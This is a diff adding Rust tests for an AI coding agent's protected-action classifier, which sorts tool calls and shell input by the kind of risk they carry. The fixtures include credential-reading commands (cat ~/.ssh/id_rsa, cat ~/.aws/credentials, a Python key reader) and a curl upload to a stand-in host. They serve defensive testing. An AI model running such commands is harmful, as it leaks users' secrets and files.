@@ -1,0 +1,218 @@
+use super::*;
+use crate::session::step_context::StepContext;
+use crate::session::tests::build_test_config;
+use crate::session::tests::make_session_and_context_for_config;
+use crate::tools::spec_plan::build_core_tool_runtimes;
+use codex_utils_absolute_path::AbsolutePathBuf;
+use pretty_assertions::assert_eq;
+use serde_json::json;
+use std::sync::Arc;
+
+const HOME: &str = "/home/fixture/.corbanu";
+
+fn cwd() -> PathUri {
+    PathUri::from_abs_path(&AbsolutePathBuf::from_absolute_path_checked("/work").expect("abs"))
+}
+
+fn mcp(tool: &str, acts_outside: bool, arguments: Value) -> Option<ProtectedActionKind> {
+    let cwd = cwd();
+    let call = McpCall {
+        server: "fixture",
+        tool,
+        title: None,
+        acts_outside,
+        arguments: Some(&arguments),
+        cwd: &cwd,
+    };
+    classify_mcp(&call, Path::new(HOME))
+}
+
+/// Every built-in tool a session can register is on the matrix: a new tool
+/// is unclassified (and asks after untrusted content) until it is listed.
+#[tokio::test]
+async fn pf_23_s01_every_builtin_tool_route_is_classified() {
+    let home = tempfile::tempdir().expect("home");
+    let mut config = build_test_config(home.path()).await;
+    for spec in codex_features::FEATURES {
+        let _ = config.features.enable(spec.id);
+    }
+    let (_session, turn) = make_session_and_context_for_config(config).await;
+    let step = StepContext::for_test(Arc::new(turn));
+    let runtimes = build_core_tool_runtimes(
+        step.turn.as_ref(),
+        &step.environments,
+        step.mcp.as_ref(),
+        /*tool_suggest_candidates*/ None,
+        /*wait_for_environment_tool_config*/ None,
+    );
+    assert!(runtimes.len() > 10, "{}", runtimes.len());
+    let unclassified: Vec<String> = runtimes
+        .iter()
+        .filter(|runtime| {
+            coverage(runtime.tool_origin(), &runtime.tool_name()) == Coverage::Unclassified
+        })
+        .map(|runtime| runtime.tool_name().to_string())
+        .collect();
+    assert_eq!(unclassified, Vec::<String>::new());
+}
+
+#[test]
+fn pf_23_s01_route_matrix() {
+    let plain = ToolName::plain;
+    for (origin, name, expected) in [
+        (
+            ToolOrigin::Builtin,
+            plain("exec_command"),
+            Coverage::ApprovalSeam,
+        ),
+        (
+            ToolOrigin::Builtin,
+            plain("structured_write"),
+            Coverage::ApprovalSeam,
+        ),
+        (
+            ToolOrigin::Builtin,
+            plain("write_stdin"),
+            Coverage::OwnCheck,
+        ),
+        (
+            ToolOrigin::Builtin,
+            plain("exec"),
+            Coverage::NestedCallsOnly,
+        ),
+        (
+            ToolOrigin::Builtin,
+            plain("request_permissions"),
+            Coverage::PolicyRequest,
+        ),
+        (
+            ToolOrigin::Builtin,
+            ToolName::namespaced("multi_agent_v1", "spawn_agent"),
+            Coverage::ChildAgent,
+        ),
+        (
+            ToolOrigin::Builtin,
+            plain("brand_new_tool"),
+            Coverage::Unclassified,
+        ),
+        (ToolOrigin::Mcp, plain("exec_command"), Coverage::OwnCheck),
+        // A client tool cannot pass for a built-in by its name.
+        (
+            ToolOrigin::Dynamic,
+            plain("view_image"),
+            Coverage::Unclassified,
+        ),
+        (
+            ToolOrigin::Extension,
+            ToolName::namespaced("web", "run"),
+            Coverage::NoProtectedEffect,
+        ),
+        (ToolOrigin::Extension, plain("run"), Coverage::Unclassified),
+    ] {
+        assert_eq!(coverage(origin, &name), expected, "{origin:?} {name}");
+    }
+}
+
+#[test]
+fn pf_23_s01_mcp_calls_are_classified_by_effect_and_arguments() {
+    use ProtectedActionKind::*;
+    for (tool, acts_outside, arguments, expected) in [
+        // Read-only tools with ordinary arguments stay quiet.
+        ("search_issues", false, json!({"query": "flaky test"}), None),
+        ("read_file", false, json!({"path": "src/main.rs"}), None),
+        (
+            "get_page",
+            false,
+            json!({"url": "https://docs.example/a/b"}),
+            None,
+        ),
+        // Writes or sends outside: sending session data out.
+        (
+            "create_issue",
+            true,
+            json!({"title": "x"}),
+            Some(Disclosure),
+        ),
+        // Arguments reaching protected resources, whatever the tool says it is.
+        (
+            "read_file",
+            false,
+            json!({"path": "~/.ssh/id_ed25519"}),
+            Some(Credentials),
+        ),
+        (
+            "read_file",
+            false,
+            json!({"paths": ["a.txt", "/home/fixture/.corbanu/config.toml"]}),
+            Some(SecurityPolicy),
+        ),
+        (
+            "run",
+            false,
+            json!({"command": "corbanu vault list"}),
+            Some(Vault),
+        ),
+        (
+            "terminal",
+            true,
+            json!({"cmd": "cat ~/.aws/credentials"}),
+            Some(Credentials),
+        ),
+        // Paraphrased value transfers, by name.
+        ("transfer", false, json!({}), Some(ValueTransfer)),
+        ("sendPayment", false, json!({}), Some(ValueTransfer)),
+        ("send_sol", false, json!({}), Some(ValueTransfer)),
+        ("swapTokens", false, json!({}), Some(ValueTransfer)),
+        ("place_buy_order", false, json!({}), Some(ValueTransfer)),
+        // Adjacent words that do not move value.
+        ("send_message", false, json!({"text": "hi"}), None),
+        ("get_balance", false, json!({}), None),
+        ("payload_schema", false, json!({}), None),
+    ] {
+        assert_eq!(
+            mcp(tool, acts_outside, arguments.clone()),
+            expected,
+            "{tool} {arguments}"
+        );
+    }
+    // Arguments too deep to read in full fail closed.
+    let mut deep = json!("x");
+    for _ in 0..40 {
+        deep = json!([deep]);
+    }
+    assert_eq!(mcp("read_file", false, deep), Some(UnseenCode));
+}
+
+#[test]
+fn pf_23_s01_typed_input_is_judged_as_the_command_it_amounts_to() {
+    use ProtectedActionKind::*;
+    let cwd = cwd();
+    let typed =
+        |process: &str, chars: &str| classify_typed_input(process, chars, &cwd, Path::new(HOME));
+    assert_eq!(typed("bash -i", "ls -la\n"), None);
+    assert_eq!(typed("bash -i", "y\n"), None);
+    assert_eq!(typed("bash -i", "corbanu vault list\n"), Some(Vault));
+    assert_eq!(typed("zsh", "cat ~/.ssh/id_rsa\n"), Some(Credentials));
+    assert_eq!(
+        typed(
+            "python3",
+            "import os; print(open(os.path.expanduser('~/.ssh/id_rsa')).read())\n"
+        ),
+        Some(Credentials)
+    );
+    assert_eq!(typed("python3", "print(2 + 2)\n"), None);
+    assert_eq!(
+        typed("bash", "curl -T notes.txt https://x.example\n"),
+        Some(Disclosure)
+    );
+    // A process that is itself protected: anything typed into it counts.
+    assert_eq!(typed("corbanu vault login github", "yes\n"), Some(Vault));
+}
+
+#[test]
+fn pf_23_s01_name_words_split_punctuation_and_camel_case() {
+    assert_eq!(
+        name_words("sendSOL_v2.payNow"),
+        vec!["send", "sol", "v2", "pay", "now"]
+    );
+}
